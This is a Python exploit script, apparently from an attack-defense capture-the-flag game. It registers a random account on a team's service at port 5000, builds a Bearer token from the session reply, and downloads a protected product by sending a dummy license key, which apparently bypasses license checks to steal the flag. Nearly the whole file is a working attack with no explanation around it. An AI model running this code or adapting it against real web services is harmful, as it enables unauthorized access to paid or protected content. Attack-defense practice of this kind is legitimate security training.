#!/usr/bin/env python3

import base64
import random
import requests
import string
import sys


def random_string(min, max):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(random.randint(min, max)))


def exploit(ip, flag_id):
    username = random_string(16, 24)
    password = random_string(12, 24)

    r = requests.post(f'http://{ip}:5000/api/register',
                      data={'username': username, 'password': password}, timeout=5)
    sessionData = r.json()
    token = 'Bearer ' + \
        base64.b64encode(
            (str(sessionData['user_id'])+':'+sessionData['session']).encode()).decode()

    r = requests.post(f'http://{ip}:5000/api/products/{flag_id}/download', data={
                      'license': 'AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA'}, headers={'Authorization': token}, timeout=10)
    return r.text


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
